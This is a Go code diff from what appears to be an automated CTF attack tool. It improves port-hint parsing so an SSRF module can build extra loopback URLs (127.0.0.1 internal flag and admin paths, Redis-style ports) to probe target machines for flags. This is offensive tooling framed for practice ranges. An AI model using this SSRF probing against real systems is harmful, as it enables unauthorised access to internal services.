@@ -116,9 +116,16 @@ func ssrfRedisTargets(hints WebHints) [][2]int {
 		ports[p] = true
 	}
 	// 题目线索里的端口（描述常写 "6399 端口"）
+	// 注意：reHintPort 有两个捕获组（"端口 N" 走 m[1]，"N 端口" 走 m[2]），
+	// 必须遍历 m[1:] —— 只看 m[1] 会漏掉 "6399 端口" 形态的线索。
 	for _, m := range reHintPort.FindAllStringSubmatch(hintTextOf(hints), 8) {
-		if n, err := strconv.Atoi(m[1]); err == nil && n > 0 && n < 65536 {
-			ports[n] = true
+		for _, g := range m[1:] {
+			if g == "" {
+				continue
+			}
+			if n, err := strconv.Atoi(g); err == nil && n > 0 && n < 65536 {
+				ports[n] = true
+			}
 		}
 	}
 	var out [][2]int
@@ -134,6 +141,21 @@ var reHintPort = regexp.MustCompile(`(?i)(?:port|端口)\s*[:：]?\s*(\d{2,5})|(
 // hintTextOf 取 hints 关联的原始文本不可行，这里返回拼接线索（端口线索从端点数字段提取）。
 func hintTextOf(hints WebHints) string {
 	return strings.Join(hints.Endpoints, " ") + " " + strings.Join(hints.Types, " ")
+}
+
+// ssrfInjectPorts 从题目原文抽取端口线索并注入 hints.Types。
+//
+// 原来 reHintPort 只作用于 hintTextOf(hints)（Endpoints+Types，不含原文），
+// 导致题目描述里的「内网 6401 端口」「Redis(127.0.0.1:6399)」等端口线索被浪费。
+// 本函数补上这一跳，使 SSRF 能在靶场端口避让（非默认端口）时仍精确定位内网服务。
+func ssrfInjectPorts(hints *WebHints, text string) {
+	for _, m := range reHintPort.FindAllStringSubmatch(text, 8) {
+		for _, g := range m[1:] {
+			if g != "" {
+				hints.Types = append(hints.Types, g+" 端口")
+			}
+		}
+	}
 }
 
 // AttackSSRF 对一个靶机执行 SSRF 利用链，返回命中的 flag。
@@ -220,6 +242,19 @@ func AttackSSRF(ctx context.Context, baseURL string, hints WebHints) []string {
 		"http://127.0.0.1:8080/internal/flag",
 		"http://127.0.0.1:6401/internal/admin",
 	}
+	// 题目线索 / 运行时注入的端口 → 追加候选（靶场端口避让时用）
+	for _, m := range reHintPort.FindAllStringSubmatch(hintTextOf(hints), 8) {
+		for _, g := range m[1:] {
+			if g == "" {
+				continue
+			}
+			if n, err := strconv.Atoi(g); err == nil && n > 0 && n < 65536 {
+				loopback = append(loopback,
+					fmt.Sprintf("http://127.0.0.1:%d/internal/flag", n),
+					fmt.Sprintf("http://127.0.0.1:%d/flag", n))
+			}
+		}
+	}
 	for _, ep := range endpoints {
 		for _, t := range loopback {
 			if ctx.Err() != nil {
@@ -258,6 +293,7 @@ func ssrfAttackFromText(ctx context.Context, text string) []string {
 		targets = targets[:2]
 	}
 	hints := ParseWebHints(text)
+	ssrfInjectPorts(&hints, text)
 
 	var out []string
 	for _, t := range targets {
